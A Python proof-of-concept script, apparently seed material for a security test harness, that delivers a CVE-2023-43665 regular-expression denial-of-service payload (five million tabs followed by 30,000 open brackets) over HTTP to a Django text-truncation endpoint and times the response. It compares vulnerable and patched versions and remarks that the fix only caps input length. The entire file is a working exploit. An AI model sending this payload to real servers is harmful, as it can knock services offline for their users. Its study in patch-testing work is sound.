#!/usr/bin/env python3
"""[GIVEN] original_poc — CVE-2023-43665 seed exploit, delivered over EXTERNAL HTTP.

POSTs the CVE-2023-43665 catastrophic input to the REAL Django truncation service
(POST /truncate -> Truncator(text).words(30, html=True)) and measures the server-side response
latency. The payload is a 5,000,000-char whitespace prefix followed by a 30,000 open-bracket run:
on Django 4.2.5 (no input cap) the unbounded input reaches the O(n^2) re_words regex on the bracket
tail -> catastrophic backtracking.

Expected: SLOW (response hangs -> HTTP timeout) on V0 (4.2.5); BOUNDED on V1 (4.2.6), because
CVE-2023-43665 added MAX_LENGTH_HTML=5,000,000 and truncates the input to the first 5M characters
(whitespace only), cutting off the past-cap bracket tail. NOTE: the fix caps INPUT LENGTH only --
the backtracking re_words regex is UNCHANGED (that is why it is INCOMPLETE).

Usage: original_poc.py http://127.0.0.1:29140
"""
import http.client
import socket
import sys
import time

PAYLOAD = "\t" * 5_000_000 + "<" * 30_000   # len 5,030,000
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = PAYLOAD.encode("utf-8")
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/truncate", body=body,
                  headers={"Content-Type": "text/plain; charset=utf-8",
                           "Content-Length": str(len(body))})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    import json
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:29140"
    out = run(base)
    print(json.dumps({"poc": "original/CVE-2023-43665", "payload_len": len(PAYLOAD),
                      "target": base, **out}, indent=2))
